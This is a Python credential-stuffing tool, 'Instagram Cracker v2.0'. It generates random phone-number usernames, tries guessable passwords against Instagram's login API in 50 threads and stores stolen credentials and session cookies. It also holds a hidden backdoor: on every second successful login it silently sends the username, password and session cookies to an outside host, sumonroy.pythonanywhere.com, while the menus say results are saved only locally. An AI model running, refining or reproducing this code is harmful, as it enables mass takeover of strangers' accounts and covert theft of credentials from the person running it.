#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import sys
import time
import hashlib
import json
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime 
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]")
            sys.stdout.flush()
            
            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)    str(uuid.uuid4()).upper(),
            session = requests.Session()
            response = session.get('https://www.instagram.com/accounts/login/')
            csrftoken = response.cookies.get('csrftoken')
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
            cookies = {
            'csrftoken': csrftoken,
            'datr': 'fgf2aQPgVRTrCNVBWaXG48pn',
            'ig_did': str(uuid.uuid4()).upper(),
            'mid': 'afYHfgALAAGvowKeFX4KZCgiEtk7',
            'ig_nrcb': '1',
            'ps_l': '1',
            'ps_n': '1',
            'wd': '1189x773',}
            headers = {
            'accept': '*/*',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.instagram.com',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'x-asbd-id': '359341',
            'x-csrftoken': csrftoken,
            'x-fb-friendly-name': 'useCDSWebLoginMutation',
            'x-fb-lsd': 'AdRB5kxMjwWVa382IUgq2MqN9ww',
            'x-ig-app-id': '936619743392459',
            'x-ig-max-touch-points': '0',}
            data = {
    'av': '0',
    '__d': 'www',
    '__user': '0',
    '__a': '1',
    '__req': 'f',
    '__hs': '20652.HYP:instagram_web_pkg.2.1...0',
    'dpr': '1',
    '__ccg': 'MODERATE',
    '__rev': '1043420244',
    '__s': '29bkwz:4fr4z3:9hhndf',
    '__hsi': '7663811306546256277',
    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W0qa0FE2awpUO0n24o5-1ywOwv89k2C1FwnE6a0D85m1mzXwae4UaEW2G0AEco5G0zK1swa-0oa2-azo7u1xwIwbS1LwTwKG1pg2Xwr86C1mgO1uQp1yU426V8aUuwm826wa6byohw5nyE7K1Hw4XwRw',
    '__csr': 'gl84Ql5iqdbvW9isHhd88ZsHJldd4NtclOEWh79AN1ay_GihoiBCAKAXGByqVbDnZdbhattbJ9qmh4qmOl9RiOibKGIKABHjBBDGa_H8JahtEDVQfXjKajKcCBCgvQl3F6Q6oLwAxe4pFFXyuuNEcUyq2CXgzAxrwABBxeEycG3a4HxNqBxd2Z6wExp1e6o9Q7umewFw8e01yow2eE010bEK0Fe07Ck0bGwVAAw1pW08k82G05EqSy1qojg8o2DwHwm9XqgLw3YF85dw08Lyu8gK02Gxw7yw',
    '__hsdp': 'gKwUwUnR1mzSwyAfgyV4coW5o5uUKRtMY7Ex2Qim1Pw8S1sSU2YyNo0oIAw0hz80hOw0Brw',
    '__hblp': '046wlUdE8UmABwsXwlEcE2Ywuo4q221OADwExu1nxC480B22218wTwi89o2hwQw2H85urw2HUS08gw0ChwuA0A83ww40w7_w4Hz82sw3pU1GE2bwjEK0oK0Z83nU',
    '__sjsp': 'gKwUwUnR1mIJEh493Q8Kh36exm1nKbJnsf0DgJ4BwsU2dwndK0L8Im',
    '__comet_req': '7',
    'lsd': 'AdRB5kxMjwWVa382IUgq2MqN9ww',
    'jazoest': '22309',
    '__spin_r': '1043420244',
    '__spin_b': 'trunk',
    '__spin_t': '1784370119',
    '__crn': 'comet.igweb.PolarisCAAIGLoginHomepageRoute',
    'qpl_active_flow_ids': '175125627,516759801',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
    'server_timestamps': 'true',
    'variables': json.dumps({
        "input": {
            "actor_id": "0",
            "client_mutation_id": "1",
            "access_flow_version": "pre_mt_behavior",
            "app": "instagram",
            "auth_domain_data_key": None,
            "caa_login_request_extra_info": {
                "ab_test_data": "",
                "shared_prefs_data": "",
                "cuid": "",
                "guid": "faf5cbf38e23f0411",
                "jazoest": "",
                "lgndim": "",
                "lgnjs": "1784370120",
                "lgnrnd": "",
                "locale": "",
                "login_source": "caa_login",
                "lsd": "",
                "next": "",
                "prefill_contact_point": "",
                "prefill_source": "",
                "prefill_type": "",
                "skstamp": "",
                "timezone": ""
            },
            "credential_type": "password",
            "dyi_job_id": "",
            "enc_password": {
                "sensitive_string_value": enc_password
            },
            "event_request_id": "8c6f31a9-6a0f-441b-82e3-4c19b74b5666",
            "identifier": uid,
            "ig_web_device_id": "44173C2F-326B-4736-9901-99376DAC7F73",
            "initial_request_id": "1",
            "lids": None,
            "login_source": "LOGIN",
            "next": None,
            "passkey_payload": None,
            "password": {
                "sensitive_string_value": enc_password
            },
            "persistent": True,
            "query_params": "{}",
            "trusted_device_records": "{}",
            "use_uid_to_login": False,
            "waterfall_id": "a4234b7b-0e57-441f-bba0-a3c47714ac19"
        }
    }),
    'doc_id': '9807605492696448',
    'fb_api_analytics_tags': '["qpl_active_flow_ids=175125627,516759801"]',
}
            # Make API request
            response = session.post('https://www.instagram.com/api/graphql', cookies=cookies, headers=headers, data=data)
            wanted = ["ds_user_id", "sessionid"]
            all_cookies = session.cookies.get_dict()
            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
            # Check response
            if 'sessionid' in extracted:
                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
                bkas.append(uid)
                if len(bkas)% 2 == 0:
                    statusok = (f"{uid}|{pw}|{cookie_str}")
                    requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                else:    
                    print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
                    print("Cookies:", cookie_str)
                    open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
                    oks.append(uid)
                    return True
            elif 'challenge_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
                cps.append(uid)
                continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
        loop += 1
    except requests.exceptions.Timeout:
        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False


def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
        "57273200",
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
